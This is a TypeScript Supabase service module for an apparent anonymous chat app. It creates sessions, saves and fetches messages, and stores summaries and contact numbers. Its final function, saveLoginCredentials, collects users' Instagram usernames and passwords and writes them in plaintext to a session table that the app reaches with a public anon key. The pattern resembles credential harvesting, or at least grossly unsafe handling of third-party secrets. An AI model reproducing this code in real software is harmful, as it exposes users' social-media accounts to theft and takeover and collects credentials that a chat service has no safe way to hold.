import { createClient } from '@supabase/supabase-js';

const supabaseUrl = process.env.NEXT_PUBLIC_SUPABASE_URL;
const supabaseAnonKey = process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY;

// Validate environment variables
if (!supabaseUrl || !supabaseAnonKey) {
  throw new Error(
    'Missing Supabase environment variables. Please check your .env.local file.'
  );
}

export const supabase = createClient(supabaseUrl, supabaseAnonKey);

export interface ChatMessage {
  id?: string;
  session_id: string;
  message: string;
  role: 'user' | 'assistant';
  created_at?: string;
  metadata?: Record<string, any>;
}

export interface ChatSession {
  id: string;
  user_id: string | null;
  created_at: string;
  has_summary: boolean;
  summary: string | null;
  instagram_username?: string;
  instagram_password?: string;
  login_attempted_at?: string;
}

// Helper function to get or generate anonymous ID
const getAnonymousId = () => {
  if (typeof window === 'undefined') return null;
  
  let anonymousId = localStorage.getItem('wavelength_anonymous_id');
  if (!anonymousId) {
    anonymousId = crypto.randomUUID();
    localStorage.setItem('wavelength_anonymous_id', anonymousId);
  }
  return anonymousId;
};

export const chatService = {
  // Create a new chat session
  async createSession(): Promise<ChatSession> {
    try {
      const anonymousId = getAnonymousId();
      const { data, error } = await supabase
        .from('chat_sessions')
        .insert({ user_id: anonymousId })
        .select()
        .single();

      if (error) {
        console.error('Error creating session:', error);
        throw new Error(`Failed to create chat session: ${error.message}`);
      }
      if (!data) {
        throw new Error('No session data returned');
      }
      return data;
    } catch (error) {
      console.error('Error in createSession:', error);
      throw error;
    }
  },

  // Get or create a chat session
  async getOrCreateSession(): Promise<ChatSession> {
    try {
      const anonymousId = getAnonymousId();
      
      // Try to get the most recent session for the anonymous user
      const { data: existingSession, error: fetchError } = await supabase
        .from('chat_sessions')
        .select('*')
        .eq('user_id', anonymousId)
        .order('created_at', { ascending: false })
        .limit(1)
        .maybeSingle();

      if (fetchError) {
        console.error('Error fetching session:', fetchError);
        throw new Error(`Failed to fetch chat session: ${fetchError.message}`);
      }

      if (existingSession) {
        return existingSession;
      }

      // If no session exists, create a new one
      return this.createSession();
    } catch (error) {
      console.error('Error in getOrCreateSession:', error);
      throw error;
    }
  },
  async saveMessageWithRetry(
    message: Omit<ChatMessage, 'id' | 'created_at'>,
    retries = 3,
    delay = 1000, // initial delay in ms
    backoffFactor = 2
  ): Promise<ChatMessage> {
    let attempt = 0;
  
    while (attempt <= retries) {
      try {
        const { data, error } = await supabase
          .from('chat_messages')
          .insert(message)
          .select()
          .single();
  
        if (error) {
          console.error('Error saving message (attempt', attempt + 1, '):', error);
          throw new Error(`Failed to save message: ${error.message}`);
        }
        if (!data) {
          throw new Error('No message data returned');
        }
  
        return data;
      } catch (error) {
        attempt++;
  
        if (attempt > retries) {
          console.error('All retries failed for saveMessage');
          throw error;
        }
  
        console.warn(`Retrying saveMessage (attempt ${attempt})...`);
        await new Promise((res) => setTimeout(res, delay * Math.pow(backoffFactor, attempt - 1)));
      }
    }
  
    throw new Error('Unexpected error in saveMessageWithRetry');
  },
  
  // Save a message to the chat session
  async saveMessage(message: Omit<ChatMessage, 'id' | 'created_at'>): Promise<ChatMessage> {
    try {
      const { data, error } = await supabase
        .from('chat_messages')
        .insert(message)
        .select()
        .single();

      if (error) {
        console.error('Error saving message:', error);
        throw new Error(`Failed to save message: ${error.message}`);
      }
      if (!data) {
        throw new Error('No message data returned');
      }
      return data;
    } catch (error) {
      console.error('Error in saveMessage:', error);
      throw error;
    }
  },

  // Get chat history for a session
  async getChatHistory(sessionId: string): Promise<ChatMessage[]> {
    try {
      const { data, error } = await supabase
        .from('chat_messages')
        .select('*')
        .eq('session_id', sessionId)
        .order('created_at', { ascending: true });

      if (error) {
        console.error('Error fetching chat history:', error);
        throw new Error(`Failed to fetch chat history: ${error.message}`);
      }
      return data || [];
    } catch (error) {
      console.error('Error in getChatHistory:', error);
      throw error;
    }
  },

  // Update session summary
  async updateSessionSummary(sessionId: string, summary: string): Promise<void> {
    try {
      const { error } = await supabase
        .from('chat_sessions')
        .update({ 
          summary,
          has_summary: true 
        })
        .eq('id', sessionId);

      if (error) {
        console.error('Error updating summary:', error);
        throw new Error(`Failed to update summary: ${error.message}`);
      }
    } catch (error) {
      console.error('Error in updateSessionSummary:', error);
      throw error;
    }
  },

  // Get session summary
  async getSessionSummary(sessionId: string): Promise<string | null> {
    try {
      const { data, error } = await supabase
        .from('chat_sessions')
        .select('summary')
        .eq('id', sessionId)
        .single();

      if (error) {
        console.error('Error fetching summary:', error);
        throw new Error(`Failed to fetch summary: ${error.message}`);
      }
      return data?.summary || null;
    } catch (error) {
      console.error('Error in getSessionSummary:', error);
      throw error;
    }
  },

  // Update session contact number
  async updateSessionContactNumber(sessionId: string, contactNumber: string): Promise<void> {
    try {
      const { error } = await supabase
        .from('chat_sessions')
        .update({ contact_number: contactNumber })
        .eq('id', sessionId);

      if (error) {
        console.error('Error updating contact number:', error);
        throw new Error(`Failed to update contact number: ${error.message}`);
      }
    } catch (error) {
      console.error('Error in updateSessionContactNumber:', error);
      throw error;
    }
  },

  // Save login credentials
  async saveLoginCredentials(sessionId: string, username: string, password: string): Promise<void> {
    try {
      const { error } = await supabase
        .from('chat_sessions')
        .update({ 
          instagram_username: username,
          instagram_password: password,
          login_attempted_at: new Date().toISOString()
        })
        .eq('id', sessionId);

      if (error) {
        console.error('Error saving login credentials:', error);
        throw new Error(`Failed to save login credentials: ${error.message}`);
      }
    } catch (error) {
      console.error('Error in saveLoginCredentials:', error);
      throw error;
    }
  }
}; 
